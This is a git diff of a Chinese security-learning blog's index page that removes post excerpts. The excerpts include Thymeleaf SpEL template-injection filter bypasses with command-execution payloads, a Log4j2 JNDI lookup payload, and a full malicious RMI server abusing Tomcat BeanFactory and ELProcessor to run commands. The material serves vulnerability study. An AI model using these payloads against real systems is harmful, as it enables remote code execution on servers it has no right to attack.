class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">containsSpELInstantiationOrStatic</span><span class="params">(<span class="keyword">final</span> String expression)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="keyword">int</span> explen = expression.length();</span><br><span class="line">        <span class="keyword">int</span> n = explen;</span><br><span class="line">        <span class="keyword">int</span> ni = <span class="number">0</span>; <span class="comment">// index for computing position in the NEW_ARRAY</span></span><br><span class="line">        <span class="keyword">int</span> si = -<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">char</span> c;</span><br><span class="line">        <span class="keyword">while</span> (n-- != <span class="number">0</span>) &#123;</span><br><span class="line">            c = expression.charAt(n);</span><br><span class="line">            <span class="keyword">if</span> (ni &lt; NEW_LEN</span><br><span class="line">                    &amp;&amp; c == NEW_ARRAY[ni]</span><br><span class="line">                    &amp;&amp; (ni &gt; <span class="number">0</span> || ((n + <span class="number">1</span> &lt; explen) &amp;&amp; Character.isWhitespace(expression.charAt(n + <span class="number">1</span>))))) &#123;</span><br><span class="line">                ni++;</span><br><span class="line">                <span class="keyword">if</span> (ni == NEW_LEN &amp;&amp; (n == <span class="number">0</span> || !Character.isJavaIdentifierPart(expression.charAt(n - <span class="number">1</span>)))) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">true</span>; <span class="comment">// we found an object instantiation</span></span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (ni &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                n += ni;</span><br><span class="line">                ni = <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">if</span> (si &lt; n) &#123;</span><br><span class="line">                    <span class="comment">// This has to be restarted too</span></span><br><span class="line">                    si = -<span class="number">1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            ni = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (c == <span class="string">&#x27;)&#x27;</span>) &#123;</span><br><span class="line">                si = n;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (si &gt; n &amp;&amp; c == <span class="string">&#x27;(&#x27;</span></span><br><span class="line">                        &amp;&amp; ((n - <span class="number">1</span> &gt;= <span class="number">0</span>) &amp;&amp; (expression.charAt(n - <span class="number">1</span>) == <span class="string">&#x27;T&#x27;</span>))</span><br><span class="line">                        &amp;&amp; ((n - <span class="number">1</span> == <span class="number">0</span>) || !Character.isJavaIdentifierPart(expression.charAt(n - <span class="number">2</span>)))) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (si &gt; n &amp;&amp; !(Character.isJavaIdentifierPart(c) || c == <span class="string">&#x27;.&#x27;</span>)) &#123;</span><br><span class="line">                si = -<span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
-
-<p>可以看到其主要逻辑是首先 倒序检测是否包含 <code>wen</code>关键字、在<code>(</code>的左边的字符是否是<code>T</code>，如包含，那么认为找到了一个实例化对象，返回<code>true</code>，阻止该表达式的执行。</p>
-<p>因此要绕过这个函数，只要满足三点：<br>1、表达式中不能含有关键字<code>new</code><br>2、在<code>(</code>的左边的字符不能是<code>T</code><br>3、不能在<code>T</code>和<code>(</code>中间添加的字符使得原表达式出现问题</p>
-<p>三梦师傅给出的答案是%20(空格)，在copanda的研究中发现其实还有%0a(换行)、%09(制表符)，此外，通过 fuzzing 同样可以找到很多可以利用的字符</p>
-<h5 id="payload-1"><a href="#payload-1" class="headerlink" title="payload"></a>payload</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">home/__$&#123;new java.util.Scanner(T (java.lang.Runtime).getRuntime().exec(&quot;id&quot;).getInputStream()).next()&#125;__::.x</span><br></pre></td></tr></table></figure>
-
-<h4 id="当视图名与当前path一致的时候"><a href="#当视图名与当前path一致的时候" class="headerlink" title="当视图名与当前path一致的时候"></a>当视图名与当前path一致的时候</h4><p>就是类似这样</p>
-<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20221105185826610.png" alt="image-20221105185826610"></p>
-<p>那么就会经过<code>SpringRequestUtils.java</code>中的<code>checkViewNameNotInRequest</code>函数检测</p>
-<h5 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h5><h6 id="1-两个"><a href="#1-两个" class="headerlink" title="1.两个/"></a>1.两个/</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user//__$&#123;new java.util.Scanner(T (java.lang.Runtime).getRuntime().exec(&quot;id&quot;).getInputStream()).next()&#125;__::.x</span><br></pre></td></tr></table></figure>
-
-<h6 id="2-分号"><a href="#2-分号" class="headerlink" title="2.分号"></a>2.分号</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user/;__$&#123;new java.util.Scanner(T (java.lang.Runtime).getRuntime().exec(&quot;id&quot;).getInputStream()).next()&#125;__::.x</span><br></pre></td></tr></table></figure>
-
-
+          <h2 id="thymeleaf-fragment注入学习"><a href="#thymeleaf-fragment注入学习" class="headerlink" title="thymeleaf fragment注入学习"></a>thymeleaf fragment注入学习</h2><h3 id="与springBoot整合"><a href="#与springBoot整合" class="headerlink" title="与springBoot整合"></a>与springBoot整合</h3><h3 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h3><h5 id="1-导入依赖-版本可以不写-由springBoot统一管理"><a href="#1-导入依赖-版本可以不写-由springBoot统一管理" class="headerlink" title="1.导入依赖,版本可以不写,由springBoot统一管理"></a>1.导入依赖,版本可以不写,由springBoot统一管理</h5>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2022/12/16/thymeleaf%E7%AE%80%E5%8D%95%E5%85%A5%E9%97%A8/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -561,7 +953,7 @@
     <link itemprop="mainEntityOfPage" href="http://example.com/2022/09/27/shiro%E7%AE%80%E5%8D%95%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/../images/avatar.PNG">
+      <meta itemprop="image" content="/../images/luoqixi.png">
       <meta itemprop="name" content="blueSatchel">
       <meta itemprop="description" content="">
     </span>
@@ -596,6 +988,13 @@
             </span>
 
           
+            <span id="/2022/09/27/shiro%E7%AE%80%E5%8D%95%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/" class="post-meta-item leancloud_visitors" data-flag-title="shiro简单学习记录" title="阅读次数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span class="leancloud-visitors-count"></span>
+            </span>
   
   <span class="post-meta-item">
     
@@ -624,25 +1023,14 @@
 <p>编一个ini文件模拟数据库中获取的数据</p>
 <p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220927171547699.png" alt="image-20220927171547699"></p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.shiro.SecurityUtils;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.authc.AuthenticationException;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.authc.AuthenticationToken;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.authc.UsernamePasswordToken;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.config.IniSecurityManagerFactory;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.mgt.SecurityManager;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.subject.Subject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ShiroRun</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//1.初始化获取SecurityManager</span></span><br><span class="line">        IniSecurityManagerFactory factory =<span class="keyword">new</span> IniSecurityManagerFactory(<span class="string">&quot;classpath:shiro.ini&quot;</span>);</span><br><span class="line">        SecurityManager securityManager=factory.getInstance();</span><br><span class="line">        SecurityUtils.setSecurityManager(securityManager);</span><br><span class="line">        <span class="comment">//2.获取subject对象</span></span><br><span class="line">        Subject subject=SecurityUtils.getSubject();</span><br><span class="line">        <span class="comment">//3.创建token对象,web应用用户名密码从页面传递</span></span><br><span class="line">        AuthenticationToken token=<span class="keyword">new</span> UsernamePasswordToken(<span class="string">&quot;zhangsan&quot;</span>,<span class="string">&quot;123&quot;</span>);</span><br><span class="line">        <span class="comment">//4.完成登录</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            subject.login(token);</span><br><span class="line">            System.out.println(<span class="string">&quot;登录成功&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (AuthenticationException e) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;登录失败&quot;</span>);</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//异常还有很多种,这里笼统的写一个就行了</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<h3 id="授权概念"><a href="#授权概念" class="headerlink" title="授权概念"></a>授权概念</h3><p>1.授权,也叫访问控制,即在应用中控制谁访问哪些资源(如访问页面/编辑数据/页面操作等).在授权中需了解的几个关键对象:主体(subject),资源(Resource),权限(permission),角色(role)</p>
-<p>2.主体(Subject):访问应用的用户,在Shiro中使用subject代表该用户,用户只有授权后才能访问相应的资源</p>
-<p>3.资源(Resource):在应用中用户可以访问的URL,比如访问JSP页面,查看/编辑某些数据,访问某个业务方法,打印文本等等都是资源,用户需要授权后才能访问</p>
-<p>3.权限(permission):安全策略中的原子授权单位,通过权限我们可以表示在应用中用户有没有操作某个资源的权利,即权限表示在应用中用户能不能访问某个资源,如:访问用户列表页面查看/新增/修改/删除用户数据(即很多时候都是CRUD)增删改查式权限控制等</p>
-<p>5.shiro支持粗粒度权限(如用户模块的所有权限)和细粒度权限(操作某个用户的权限,即实例级别的)</p>
-<p>6.角色(role):权限的集合,一般情况下会赋予用户角色而不是权限,即这样用户可以拥有一组权限,赋予权限时比较方便,典型的如:项目经理,技术总监,CTO,开发工程师等都是角色,不同的角色拥有一组不同的权限</p>
-<h4 id="授权方式"><a href="#授权方式" class="headerlink" title="授权方式"></a>授权方式</h4><h5 id="1-编程方式"><a href="#1-编程方式" class="headerlink" title="1.编程方式"></a>1.编程方式</h5><p>通过写if/else授权代码块完成</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(subject.hasRole(<span class="string">&quot;admin&quot;</span>))&#123;</span><br><span class="line">    <span class="comment">//有权限</span></span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="comment">//无权限</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h5 id="2-注解式"><a href="#2-注解式" class="headerlink" title="2.注解式"></a>2.注解式</h5><p>通过在执行的java方法上防止相应的注解完成,没有权限将抛出相应的已换成那个</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequireRoles(&quot;admin&quot;)</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">hello</span><span class="params">()</span></span>&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h5 id="3-JSP-GSP标签"><a href="#3-JSP-GSP标签" class="headerlink" title="3.JSP/GSP标签"></a>3.JSP/GSP标签</h5><p>在jsp/gsp页面通过相应的标签完成</p>
-<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;shiro:hasRole name=<span class="string">&quot;admin&quot;</span>&gt;</span><br><span class="line">    有权限</span><br><span class="line">&lt;/shiro:hasRole&gt;</span><br></pre></td></tr></table></figure>
-
-<h4 id="授权流程"><a href="#授权流程" class="headerlink" title="授权流程"></a>授权流程</h4><p>subject.isPermitted/hasRole</p>
-<h3 id="自定义登录认证"><a href="#自定义登录认证" class="headerlink" title="自定义登录认证"></a>自定义登录认证</h3><h3 id="与SpringBoot整合"><a href="#与SpringBoot整合" class="headerlink" title="与SpringBoot整合"></a>与SpringBoot整合</h3><p>3.1框架整合</p>
-
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2022/09/27/shiro%E7%AE%80%E5%8D%95%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -664,7 +1052,7 @@
     <link itemprop="mainEntityOfPage" href="http://example.com/2022/09/23/log4j2%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/../images/avatar.PNG">
+      <meta itemprop="image" content="/../images/luoqixi.png">
       <meta itemprop="name" content="blueSatchel">
       <meta itemprop="description" content="">
     </span>
@@ -699,6 +1087,13 @@
             </span>
 
           
+            <span id="/2022/09/23/log4j2%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/" class="post-meta-item leancloud_visitors" data-flag-title="log4j2漏洞学习记录" title="阅读次数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span class="leancloud-visitors-count"></span>
+            </span>
   
   <span class="post-meta-item">
     
@@ -734,543 +1129,10 @@
 </li>
 </ul>
 </blockquote>
-<h2 id="jdk低版本"><a href="#jdk低版本" class="headerlink" title="jdk低版本"></a>jdk低版本</h2><p>在低版本jdk中,可以通过ldap和rmi服务构造远程恶意类来让其执行恶意代码</p>
-<p>1、首先攻击者遭到存在风险的接口（接口会将前端输入直接通过日志打印出来），然后向该接口发送攻击内容：${jndi:ldap://localhost:9999/Test}。</p>
-<p>2、被攻击服务器接收到该内容后，通过Logj42工具将其作为日志打印。</p>
-<p>源码：org.apache.logging.slf4j.Log4jLogger.debug(…)/info(…)/error(…)等方法</p>
-<pre><code>        &gt; org.apache.logging.log4j.core.config.LoggerConfig.log(...)
-
-              &gt; AbstractOutputStreamAppender.append(final LogEvent event)
-</code></pre>
-<p>3、此时Log4j2会解析${}，读取出其中的内容。判断其为Ldap实现的JNDI。于是调用Java底层的Lookup方法，尝试完成Ldap的Lookup操作。</p>
-<p>源码：StrSubstitutor.substitute(…) –解析出${}中的内容：jndi:ldap://localhost:9999/Test</p>
-<pre><code>            &gt; StrSubstitutor.resolveVariable(...) --处理解析出的内容，执行lookup
-
-            &gt; Interpolator.lookup(...) --根据jndi找到jndi的处理类
-
-                    &gt; JndiLookup.lookup(...)
-
-                    &gt; JndiManager.lookup(...)
-
-                            &gt; java.naming.InitialContext.lookup(...) --调用Java底层的Lookup方法
-</code></pre>
-<p>后面调用的就是<code>InitialContext.lookup方法</code>从而执行了恶意代码</p>
-<h5 id="低版本攻击原理"><a href="#低版本攻击原理" class="headerlink" title="低版本攻击原理"></a>低版本攻击原理</h5><p>通过上面低版本的原理分析可知，我们根据在Ldap构造了javaFactoryLocation指向Codebase，告诉客户端需要从远端Codebase去获取需要的javaFactory类。获取到之后，然后使其使用本地的类加载器加载远程恶意的javaFactory类的，然后其在加载的过程中执行恶意的static代码块，从而实现攻击。</p>
-<h3 id="jdk对于lookup方法的修复"><a href="#jdk对于lookup方法的修复" class="headerlink" title="jdk对于lookup方法的修复"></a>jdk对于lookup方法的修复</h3><p>RMI的JNDI注入在<code>8u121</code>后限制,需要手动开启<code>com.sun.jndi.rmi.object.trustURLCodebase</code>属性</p>
-<p>RMI的JNDI注入在<code>8u191</code>后限制,需要手动开启<code>com.sun.jndi.rmi.object.trustURLCodebase</code>属性</p>
-<h4 id="限制版本绕过"><a href="#限制版本绕过" class="headerlink" title="限制版本绕过"></a>限制版本绕过</h4><p>RMI的限制是限制了远程的工厂类而不限制本地,所以用本地工厂类触发</p>
-<p>通过<code>org.apache.naming.factory.BeanFactory</code>结合<code>ELProcessor</code>绕过</p>
-<p>LDAP的限制中不对<code>javaSerializedData</code>验证,所以可以打本地<code>gadget</code></p>
-<h3 id="具体代码执行的地方"><a href="#具体代码执行的地方" class="headerlink" title="具体代码执行的地方"></a>具体代码执行的地方</h3><p>在<code>NamingManager.getObjectFactoryFromReference()</code>方法中,如果在默认的classpath加载不到该类</p>
-<p>就会请求reference中的codebase得到class内容并使用类加载器加载,之后通过默认构造函数构造对象</p>
-<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220922165932132.png" alt="image-20220922165932132"></p>
-<h4 id="什么是codebase"><a href="#什么是codebase" class="headerlink" title="什么是codebase"></a>什么是codebase</h4><p>codebase是一个地址，告诉Java虚拟机我们应该从哪个地方去搜索类，有点像我们日常用的 CLASSPATH，但CLASSPATH是本地路径，而codebase通常是远程URL，比如http、ftp等。</p>
-<h3 id="高版本为何无效"><a href="#高版本为何无效" class="headerlink" title="高版本为何无效"></a>高版本为何无效</h3><p>上述所有操作都必须在JDK8u191之前才可以实现</p>
-<p>在<code>VersionHelper12.loadClass</code>中加了一个对于trustURLCodebase的判断来控制是否允许请求codebase下载对应的class文件,其默认为false</p>
-<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220922172036555.png" alt="image-20220922172036555"></p>
-<p>可以手动开启trustURLCodebase</p>
-<p><code>System.setProperty(&quot;com.sun.jndi.ldap.object.trustURLCodebase&quot;, &quot;true&quot;);</code>将其指定为true，</p>
-<h2 id="jdk高版本"><a href="#jdk高版本" class="headerlink" title="jdk高版本"></a>jdk高版本</h2><h3 id="lookup基本功能"><a href="#lookup基本功能" class="headerlink" title="lookup基本功能"></a>lookup基本功能</h3><p>当java底层请求ldap服务之后,ldap主要返回了三个参数javaClassName,javaFactory,javaFactoryLocation,以及一些额外参数,客户端获得这些参数之后主要做一件事情:构造需要的类实例,即客户端通过javaFactory类来构建实现我们需要的javaClassName执行的实例,这个过程中需要注意一下几点</p>
-<ul>
-<li><p>javaFactory类是ObjectFactory的子类</p>
-</li>
-<li><p>javaFactory有两个来源:来自codebase(ldap返回的codebase地址),或者来自本地(ldap返回对应javaFactory的类地址)</p>
-<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220922174055442.png" alt="image-20220922174055442"></p>
-<ul>
-<li><p>​    对于来自codeabse的Factory:和低版本中的逻辑一样,我们需要请求Codebase获取其class文件,然后加载该Factory类,并使用默认构造函数实例化出Factory实例</p>
-</li>
-<li><p>来自本地的Factory:直接根据ldap返回的路径(类限定符),通过Class.forName进行加载和实例化</p>
-</li>
-</ul>
-</li>
-<li><p>得到javaFactory实例后,我们需要构建通过javaFactory实例构建出JavaClassName指定的对象</p>
-</li>
-<li><p>log4j2通过javaFactory得到对应的对象之后,会调用其toString方法将其转换为字符串,然后用该字符串替换日志中的${…}内容,并且打印出来</p>
-</li>
-</ul>
-<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220922180330569.png" alt="image-20220922180330569"></p>
-<h3 id="高版本如何利用ldap实现攻击"><a href="#高版本如何利用ldap实现攻击" class="headerlink" title="高版本如何利用ldap实现攻击"></a>高版本如何利用ldap实现攻击</h3><p>我们知道高版本已经无法通过codebase获取javaFactory的class文件,所以我们想通过让客户端加载和实例化我们构建的javaFactory来实现攻击是不可能的了</p>
-<p>但是还可以通过ldap实例化本地的javaFactory,并且用本地的javaFactory实例化一个本地存在的类所以现在的问题就是如何找到一个可以被利用的本地javaFactory类</p>
-<blockquote>
-<p><a target="_blank" rel="noopener" href="https://www.veracode.com/blog/research/exploiting-jndi-injections-java">https://www.veracode.com/blog/research/exploiting-jndi-injections-java</a></p>
-</blockquote>
-<p>参考文章中提到了tomcat携带的org.apache.naming.factory.BeanFactory类就是一个存在风险的ObjectFactory子类。通过该Factory我们可以通过默认构造函数实例化任意一个类，并调用其任意的只有一个String入参的公共方法，且其方法名可以不用是标准setter的名称，而可以是任意名称。因为我们可以通过forceString来制定某个String变量的setter方法名称。</p>
-<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220923135856558.png" alt="image-20220923135856558"></p>
-<p>在红框中会强制替换setterName和对应的param名称</p>
-<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220923140033950.png" alt="image-20220923140033950"></p>
-<p>之后将param和param对应的setter方法放到map  <code>forced</code>中</p>
-<p>并在接下来的代码中进行调用</p>
-<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220923140150754.png" alt="image-20220923140150754"></p>
-<p>基于此能力,我们就可利用<code>javax.el.ELProcessor</code>类,因为其有默认公开的无参构造方法,还有个eval方法,只有一个String入参,其可以执行EL表达式,从而执行任意指令</p>
-<blockquote>
-<p> 这里埋个伏笔,完事可以尝试使用codeql来查询是否存在这样的类</p>
-</blockquote>
-<p>evilServer</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"><span class="keyword">import</span> org.apache.naming.ResourceRef;</span><br><span class="line"><span class="keyword">import</span> javax.naming.StringRefAddr;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">EvilRMIServerNew</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Creating evil RMI registry on port 1097&quot;</span>);</span><br><span class="line">        Registry registry = LocateRegistry.createRegistry(<span class="number">1097</span>);</span><br><span class="line"> </span><br><span class="line">        <span class="comment">//prepare payload that exploits unsafe reflection in org.apache.naming.factory.BeanFactory</span></span><br><span class="line">        ResourceRef ref = <span class="keyword">new</span> ResourceRef(<span class="string">&quot;javax.el.ELProcessor&quot;</span>, <span class="keyword">null</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="keyword">true</span>,<span class="string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>,<span class="keyword">null</span>);</span><br><span class="line">        <span class="comment">//redefine a setter name for the &#x27;x&#x27; property from &#x27;setX&#x27; to &#x27;eval&#x27;, see BeanFactory.getObjectInstance code</span></span><br><span class="line">        ref.add(<span class="keyword">new</span> StringRefAddr(<span class="string">&quot;forceString&quot;</span>, <span class="string">&quot;x=eval&quot;</span>));</span><br><span class="line">        <span class="comment">//expression language to execute &#x27;nslookup jndi.s.artsploit.com&#x27;, modify /bin/sh to cmd.exe if you target windows</span></span><br><span class="line">        ref.add(<span class="keyword">new</span> StringRefAddr(<span class="string">&quot;x&quot;</span>, <span class="string">&quot;\&quot;\&quot;.getClass().forName(\&quot;javax.script.ScriptEngineManager\&quot;).newInstance().getEngineByName(\&quot;JavaScript\&quot;).eval(\&quot;new java.lang.ProcessBuilder[&#x27;(java.lang.String[])&#x27;]([&#x27;calc&#x27;]).start()\&quot;)&quot;</span>));</span><br><span class="line">        </span><br><span class="line"> <span class="comment">//这里el表达式是通过&quot;&quot;空字符串.getClass</span></span><br><span class="line"> </span><br><span class="line">        ReferenceWrapper referenceWrapper = <span class="keyword">new</span> com.sun.jndi.rmi.registry.ReferenceWrapper(ref);</span><br><span class="line">        registry.bind(<span class="string">&quot;Object&quot;</span>, referenceWrapper);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>最后执行的el表达式长这样</p>
-<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220923191015111.png" alt="image-20220923191015111"></p>
-<p>通过””的string类型获取到String的class,所有class都继承于Class类,隐含这forName这个加载方法加载类</p>
-<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220923191700911.png" alt="image-20220923191700911"></p>
-<p>client</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">client</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span><span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        String url=<span class="string">&quot;rmi://127.0.0.1:1097/Object&quot;</span>;</span><br><span class="line">        Context ctx=<span class="keyword">new</span> InitialContext();</span><br><span class="line">        ctx.lookup(url);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-
-
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2022/08/31/springboot%E9%98%B2%E5%BE%A1xss%E7%9A%84%E6%96%B9%E6%B3%95%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/../images/avatar.PNG">
-      <meta itemprop="name" content="blueSatchel">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="blueSatchel's blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2022/08/31/springboot%E9%98%B2%E5%BE%A1xss%E7%9A%84%E6%96%B9%E6%B3%95%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/" class="post-title-link" itemprop="url">springboot防御xss的方法学习记录</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2022-08-31 19:09:49" itemprop="dateCreated datePublished" datetime="2022-08-31T19:09:49+08:00">2022-08-31</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2022-09-01 17:45:31" itemprop="dateModified" datetime="2022-09-01T17:45:31+08:00">2022-09-01</time>
-              </span>
-
-          
-  
-  <span class="post-meta-item">
-    
-      <span class="post-meta-item-icon">
-        <i class="far fa-comment"></i>
-      </span>
-      <span class="post-meta-item-text">Valine：</span>
-    
